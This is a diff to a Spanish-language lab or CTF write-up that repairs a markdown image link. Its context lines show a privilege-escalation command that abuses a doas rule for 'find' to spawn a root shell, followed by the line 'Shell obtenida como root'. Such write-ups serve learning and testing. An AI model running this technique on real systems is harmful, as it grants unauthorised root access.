@@ -182,7 +182,7 @@ La regla autoriza al usuario `adam` a ejecutar `/usr/bin/find` como root, sin co
 doas /usr/bin/find . -exec /bin/sh \; -quit
 ```
 
-|[Escalada de privilegios find suid](screenshots/05-find-suid-privesc.png)
+![Escalada de privilegios find suid](screenshots/05-find-suid-privesc.png)
 
 Shell obtenida como `root`.
 
